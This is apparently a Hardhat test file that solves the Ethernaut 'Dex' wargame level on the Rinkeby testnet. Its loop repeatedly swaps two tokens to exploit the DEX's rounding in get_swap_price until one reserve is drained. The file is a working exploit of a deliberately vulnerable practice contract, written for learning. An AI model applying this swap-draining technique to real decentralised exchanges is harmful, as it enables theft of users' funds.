// npx hardhat test ./test/22_dex.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Dex";

let ACCOUNT;
let TOKEN_1_ADR;
let TOKEN_2_ADR;

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._22_dex, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    const accounts = await ethers.getSigners();
    ACCOUNT = accounts[0];

    TOKEN_1_ADR = levelContract.token1();
    TOKEN_2_ADR = levelContract.token2();

    await printContractBalance();

    let token1AccountBalance = await levelContract.balanceOf(TOKEN_1_ADR, ACCOUNT.address);
    let token1DEXBalance = await levelContract.balanceOf(TOKEN_1_ADR, levelContract.address);
    let token2AccountBalance = await levelContract.balanceOf(TOKEN_2_ADR, ACCOUNT.address);
    let token2DEXBalance = await levelContract.balanceOf(TOKEN_2_ADR, levelContract.address);

    let addressFrom;
    let addressTo;
    let amount;
    let swapAmount;
    let toBalance;

    let tx = await levelContract.approve(
        levelContract.address, ethers.utils.parseUnits(`1`, `ether`)
    );
    await tx.wait();

    while (token1DEXBalance > 0 && token2DEXBalance > 0) {
        if (token1AccountBalance >= token2AccountBalance) {
            addressFrom = TOKEN_1_ADR;
            addressTo = TOKEN_2_ADR;
            amount = token1AccountBalance;
        } else {
            addressFrom = TOKEN_2_ADR;
            addressTo = TOKEN_1_ADR;
            amount = token2AccountBalance;
        }

        swapAmount = await levelContract.get_swap_price(addressFrom, addressTo, amount);
        toBalance = await levelContract.balanceOf(addressTo, levelContract.address);
        //if (toBalance < swapAmount) {
        if (toBalance.lt(swapAmount)) {
            // swapAmount amount can't be larger than toBalance
            // amount = toBalance * fromBalance / toBalance
            amount = await levelContract.balanceOf(addressFrom, levelContract.address);
        }
        tx = await levelContract.swap(addressFrom, addressTo, amount);
        await tx.wait();

        token1AccountBalance = await levelContract.balanceOf(TOKEN_1_ADR, ACCOUNT.address);
        token1DEXBalance = await levelContract.balanceOf(TOKEN_1_ADR, levelContract.address);
        token2AccountBalance = await levelContract.balanceOf(TOKEN_2_ADR, ACCOUNT.address);
        token2DEXBalance = await levelContract.balanceOf(TOKEN_2_ADR, levelContract.address);

        await printContractBalance();
    }

    /*let attackFactory = await ethers.getContractFactory("ForceAttack");
    let attack = await attackFactory.deploy();
    let tx = await attack.attack(levelContract.address, { value: ethers.utils.parseUnits(`1`, `wei`) });
    await tx.wait();*/
    //console.log(tx);
});


async function printContractBalance() {
    let token1AccountBalance = await levelContract.balanceOf(TOKEN_1_ADR, ACCOUNT.address);
    let token1DEXBalance = await levelContract.balanceOf(TOKEN_1_ADR, levelContract.address);
    let token2AccountBalance = await levelContract.balanceOf(TOKEN_2_ADR, ACCOUNT.address);
    let token2DEXBalance = await levelContract.balanceOf(TOKEN_2_ADR, levelContract.address);
    console.log(`Token1 - account balance: ${token1AccountBalance} dex balance: ${token1DEXBalance}`);
    console.log(`Token2 - account balance: ${token2AccountBalance} dex balance: ${token2DEXBalance}`);
    console.log(`-----------------------------------`);
};

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});